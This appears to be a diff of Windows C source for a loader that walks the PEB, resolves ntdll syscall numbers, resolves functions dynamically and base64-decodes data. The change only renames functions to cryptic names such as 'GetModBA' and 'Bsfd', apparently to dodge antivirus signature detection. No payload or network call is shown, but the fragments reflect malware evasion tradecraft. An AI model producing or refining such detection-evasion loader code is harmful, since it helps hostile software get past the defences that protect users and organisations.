@@ -5,7 +5,8 @@
 #include <stdlib.h>
 #include <winternl.h>
 
-PVOID GetModuleBaseAddress(LPCWSTR moduleName) {
+//GetModuleBaseAddress
+PVOID GetModBA(LPCWSTR moduleName) {
     PPEB pPeb = (PPEB)__readgsqword(0x60); // 0x60 is PEB offset for x64
     PPEB_LDR_DATA pLdr = pPeb->Ldr;
     PLIST_ENTRY pListEntry = &pLdr->InMemoryOrderModuleList;
@@ -25,7 +26,7 @@ PVOID GetModuleBaseAddress(LPCWSTR moduleName) {
 }
 
 DWORD GetSyid(LPCSTR functionName) {
-    PVOID ntdllBase = GetModuleBaseAddress(L"ntdll.dll");
+    PVOID ntdllBase = GetModBA(L"ntdll.dll");
     if (!ntdllBase) return 0;
 
     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)ntdllBase;
@@ -75,7 +76,7 @@ FARPROC ResolveFn(LPCSTR mod, LPCSTR fn) {
 }
 
 // Function to Base64 Decode
-char* base64Decode(const char* encoded) {
+char* Bsfd(const char* encoded) {
     DWORD outLen = 0;
     BYTE* decoded = NULL;
     
